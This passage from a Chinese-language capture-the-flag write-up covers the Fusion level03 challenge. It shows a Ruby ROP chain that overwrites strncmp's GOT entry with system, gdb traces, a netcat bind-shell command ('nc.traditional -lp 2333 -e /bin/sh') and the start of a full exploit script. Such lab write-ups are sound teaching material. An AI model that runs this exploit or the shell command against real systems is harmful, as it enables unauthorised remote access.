+</span></span><span class="line"><span class="cl"><span class="mh">0x804bda0</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb763dce0</span>
+</span></span></code></pre></div><p>system 和 write 都是 <code>&lt;text variable, no debug info&gt;</code>，但是 strncmp 和 memcpy 是 <code>&lt;text gnu-indirect-function variable, no debug info&gt;</code>&hellip;?</p>
+<p>这个 indirect 是什么意思呢？</p>
+<blockquote>
+<p>GNU indirect function (ifunc) is a mechanism making a direct function call resolve to an implementation picked by a resolver. It is mainly used in glibc but has adoption in FreeBSD.</p>
+<p>For some performance critical functions, e.g. memcpy/memset/strcpy, glibc provides multiple implementations optimized for different architecture levels. The application just uses memcpy(&hellip;) which compiles to call memcpy. The linker will create a PLT for memcpy and produce an associated special dynamic relocation referencing the resolver symbol/address. During relocation resolving at runtime, the return value of the resolver will be placed in the GOT entry and the PLT entry will load the address.</p>
+<p>On Mach-O, there is a similar feature called N_SYMBOL_RESOLVER.
+<br></p>
+<p><a class="link" href="http://maskray.me/blog/2021-01-18-gnu-indirect-function"  target="_blank" rel="noopener"
+    >GNU indirect function - MaskRay</a></p>
+</blockquote>
+<p>啊&hellip;好麻烦x 以后再看看吧</p>
+<p>总之重新换个方式算偏移&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="n">strncmp</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$3</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">gnu</span><span class="o">-</span><span class="n">indirect</span><span class="o">-</span><span class="n">function</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb75a0530</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="n">strncmp</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xb75a0530</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0x762de853</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x0804bda0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x804bda0</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb763dce0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 可见 p strncmp 和 x strncmp 的结果是一样的</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 但是又和直接 x strncmp@got.plt 的结果不一样</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$4</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7566b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 用 x strncmp@got.plt 的结果算出的偏移量为：0xFFF28E40</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 重启程序再试一次：</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="mh">0x0804bda0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x804bda0</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb7600ce0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">p</span> <span class="nb">system</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$2</span> <span class="o">=</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">text</span> <span class="n">variable</span><span class="p">,</span> <span class="n">no</span> <span class="n">debug</span> <span class="n">info</span><span class="o">&gt;</span><span class="p">}</span> <span class="mh">0xb7529b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 这时候的偏移量也是 0xFFF28E40，好耶！</span>
+</span></span></code></pre></div><p>那么修改为如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># strncmp -&gt; system</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048bf0</span> <span class="c1"># pop ebx ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xAAA9B8DC</span> <span class="c1"># ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08049b4f</span> <span class="c1"># pop eax ; add esp, 0x5c ; ret </span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xFFF28E40</span> <span class="c1"># offset of libc system and strncmp # x strncmp@got.plt</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mh">0x5c</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x080493fe</span> <span class="c1"># add dword ptr [ebx + 0x5d5b04c4], eax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048f50</span> <span class="c1"># call &lt;strncmp@plt&gt; just for test</span>
+</span></span></code></pre></div><p>在 <code>add dword ptr [ebx + 0x5d5b04c4], eax ; ret</code> 打断点：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x080493fe</span> <span class="k">in</span> <span class="n">__do_global_dtors_aux</span> <span class="p">()</span> <span class="n">at</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">257</span>
+</span></span><span class="line"><span class="cl"><span class="mi">257</span>	<span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">	<span class="k">in</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">reg</span>
+</span></span><span class="line"><span class="cl"><span class="n">eax</span>            <span class="mh">0xfff28e40</span>	<span class="o">-</span><span class="mi">881088</span>
+</span></span><span class="line"><span class="cl"><span class="n">ecx</span>            <span class="mh">0x9f37710</span>	<span class="mi">166950672</span>
+</span></span><span class="line"><span class="cl"><span class="n">edx</span>            <span class="mh">0x804be0c</span>	<span class="mi">134528524</span>
+</span></span><span class="line"><span class="cl"><span class="n">ebx</span>            <span class="mh">0xaaa9b8dc</span>	<span class="o">-</span><span class="mi">1431717668</span>
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span> <span class="vg">$ebx</span> <span class="o">+</span> <span class="mh">0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x804bda0</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb7600ce0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0xb7600ce0</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0xb7600ce0</span> <span class="o">&lt;</span><span class="n">__strncmp_sse4_2</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 前进一步就该是 system 了：</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x804bda0</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x804bda0</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@got</span><span class="o">.</span><span class="n">plt</span><span class="o">&gt;</span><span class="p">:</span>	<span class="mh">0xb7529b20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0xb7529b20</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0xb7529b20</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nb">sub</span>    <span class="vg">$0x10</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
+</span></span></code></pre></div><p>成功！！！！</p>
+<p><del>oaoaowuuuwuaoaoaowuoouawuaouoyeyeyeyehkoaao</del></p>
+<p><del>（到这一步又花了一个下午加一个晚上的时间）</del></p>
+<p><del>（真的，哭死）</del></p>
+<hr>
+<h2 id="end-1">END.</h2>
+<p>终于要结束了吧&hellip;</p>
+<p>把这些东西组合起来&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="n">validate_request</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x8049ab0</span> <span class="o">&lt;</span><span class="n">validate_request</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nb">sub</span>    <span class="vg">$0x5c</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">title</span>  <span class="o">=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s1">&#39;\\\\\uAAAA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mi">27</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;ABCD&#34;</span>       <span class="c1">#ebp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># gRequest -&gt; gContents</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># memcpy(void *restrict dst, const void *restrict src, size_t n) : 0x08048e60</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048e60</span> <span class="c1"># memcpy</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804964d</span> <span class="c1"># return addr : pop ebx ; pop esi ; pop edi ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804be08</span> <span class="c1"># *dest     0x804be08 &lt;gRequest&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x0804bdf4</span> <span class="c1"># *src      0x804bdf4 &lt;gContents&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s1">&#39;\\\\\u0400&#39;</span> <span class="o">+</span> <span class="s1">&#39;\\\\\u0000&#39;</span> <span class="c1"># size = 0x00000004</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># title += p32 0x23332333 # sigsegv for test</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># strncmp -&gt; system</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08048bf0</span> <span class="c1"># pop ebx ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xAAA9B8DC</span> <span class="c1"># ebx = strncmp GOT record 0x0804bda0 - 0x5d5b04c4</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x08049b4f</span> <span class="c1"># pop eax ; add esp, 0x5c ; ret </span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0xFFF28E40</span> <span class="c1"># offset of libc system and strncmp # x strncmp@got.plt</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="s2">&#34;w&#34;</span> <span class="o">*</span> <span class="mh">0x5c</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x080493fe</span> <span class="c1"># add dword ptr [ebx + 0x5d5b04c4], eax ; ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># title += p32 0x08048f50 # call &lt;strncmp@plt&gt; just for test</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># we replaced strncmp with system</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># and replaced gRequest with gContents</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># now the strncmp in &lt;validate_request&gt; acts like:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># system(gContents)</span>
+</span></span><span class="line"><span class="cl"><span class="n">title</span> <span class="o">+=</span> <span class="n">p32</span> <span class="mh">0x8049ab0</span> <span class="c1"># &lt;validate_request&gt;</span>
+</span></span></code></pre></div><p>然后在那个可怜的 <code>strncmp(gRequest, token, strlen(token))</code> 前打断点吧</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span> <span class="n">validate_request</span>
+</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="ss">validate_request</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ab0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nb">sub</span>    <span class="vg">$0x5c</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ab3</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebx</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ab7</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="mh">0x804bdf8</span><span class="p">,</span><span class="o">%</span><span class="n">ebx</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049abd</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">esi</span><span class="p">,</span><span class="mh">0x50</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ac1</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">edi</span><span class="p">,</span><span class="mh">0x54</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ac5</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebp</span><span class="p">,</span><span class="mh">0x58</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ac9</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebx</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049acc</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">call</span>   <span class="mh">0x8048e70</span> <span class="o">&lt;</span><span class="n">strlen</span><span class="vi">@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ad1</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="mh">0x804be08</span><span class="p">,</span><span class="o">%</span><span class="n">esi</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ad7</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">ebx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049adb</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">esi</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ade</span> <span class="o">&lt;+</span><span class="mi">46</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="mh">0x08049ae2</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">call</span>   <span class="mh">0x8048f50</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="vi">@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="o">......</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="mh">0x8049ae2</span>
+</span></span><span class="line"><span class="cl"><span class="no">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x8049ae2</span><span class="p">:</span> <span class="n">file</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mi">75</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="no">Continuing</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="no">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08049ae2</span> <span class="k">in</span> <span class="n">validate_request</span> <span class="p">()</span> <span class="n">at</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">75</span>
+</span></span><span class="line"><span class="cl"><span class="mi">75</span>	<span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="no">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">	<span class="k">in</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="no">Continuing</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="no">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x08049ae2</span> <span class="k">in</span> <span class="n">validate_request</span> <span class="p">()</span> <span class="n">at</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">75</span>
+</span></span><span class="line"><span class="cl"><span class="mi">75</span>	<span class="k">in</span> <span class="n">level03</span><span class="o">/</span><span class="n">level03</span><span class="o">.</span><span class="n">c</span>
+</span></span></code></pre></div><p>（记得要第二次到断点的时候才是我们替换完之后手动跳 <code>validate_request</code> 的时候</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">wx</span> <span class="vg">$esp</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xbf852db8</span><span class="p">:</span>	<span class="mh">0x09f37708</span>	<span class="mh">0x09f36008</span>	<span class="mh">0x0000003f</span>	<span class="mh">0x77777777</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="mh">0x09f37708</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0x9f37708</span><span class="p">:</span>	 <span class="s2">&#34;/bin/nc.traditional -lp 2333 -e /bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="no">Continuing</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="vi">@fusion</span><span class="ss">:~</span><span class="c1"># netstat -ap | grep nc.traditional</span>
+</span></span><span class="line"><span class="cl"><span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="o">*</span><span class="p">:</span><span class="mi">2333</span>                  <span class="o">*</span><span class="ss">:*</span>                     <span class="no">LISTEN</span>      <span class="mi">2065</span><span class="o">/</span><span class="n">nc</span><span class="o">.</span><span class="n">traditional</span>
+</span></span></code></pre></div><p>成..成功了&hellip;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">nc</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">215</span><span class="o">.</span><span class="mi">135</span> <span class="mi">2333</span>
+</span></span><span class="line"><span class="cl"><span class="nb">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">20003</span> <span class="n">gid</span><span class="o">=</span><span class="mi">20003</span> <span class="n">groups</span><span class="o">=</span><span class="mi">20003</span>
+</span></span><span class="line"><span class="cl"><span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
+</span></span><span class="line"><span class="cl"><span class="no">Linux</span> <span class="n">fusion</span> <span class="mi">3</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">13</span><span class="o">-</span><span class="n">generic</span><span class="o">-</span><span class="n">pae</span> <span class="c1">#22-Ubuntu SMP Wed Nov 2 15:17:35 UTC 2011 i686 i686 i386 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></div><p>心情激动，但是说不出话</p>
+<hr>
+<p>最后是完整的脚本</p>
+<details>
+<summary>展开...</summary>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/ruby</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># encoding: ASCII-8BIT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;openssl&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;securerandom&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;json&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># print &#39;==&gt; Enter hostname:&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">hostname</span> <span class="o">=</span> <span class="s1">&#39;192.168.215.135&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hostname = gets.chomp</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">20003</span>
+</span></span><span class="line"><span class="cl"><span class="vg">$socket</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">press_to_c</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span> <span class="s1">&#39;==&gt; press enter to continue&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">gets</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Trim the double quotes from the beginning and end of the string</span>
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="vg">$socket</span><span class="o">.</span><span class="n">gets</span>
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="o">[</span><span class="mi">1</span><span class="o">..</span><span class="n">token</span><span class="o">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">3</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;==&gt; received token:</span><span class="se">\n</span><span class="si">#{</span><span class="n">token</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">=begin
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ...
+</span></span></span><span class="line"><span class="cl"><span class="cm">  invalid = result[0] | result[1];
+</span></span></span><span class="line"><span class="cl"><span class="cm">  if(invalid) errx(EXIT_FAILURE, &#34;Checksum failed!......
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ...
+</span></span></span><span class="line"><span class="cl"><span class="cm">so the first two bytes of hmac must be \x00
+</span></span></span><span class="line"><span class="cl"><span class="cm">to do this we must generate a random string
+</span></span></span><span class="line"><span class="cl"><span class="cm">and try to hmac it several times
+</span></span></span><span class="line"><span class="cl"><span class="cm">until the first two bytes of result are \x00
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">the real vuln is in decode_string()
+</span></span></span><span class="line"><span class="cl"><span class="cm">if the 127 character is &#39;\&#39; than it will try to parse the 128 character
+</span></span></span><span class="line"><span class="cl"><span class="cm">if the 128 character is &#39;u&#39; than it will try to parse next four character
+</span></span></span><span class="line"><span class="cl"><span class="cm">than while(*src &amp;&amp; dest != end) will always be true
+</span></span></span><span class="line"><span class="cl"><span class="cm">which allows us to write as many characterss as we want 
+</span></span></span><span class="line"><span class="cl"><span class="cm">=end</span>
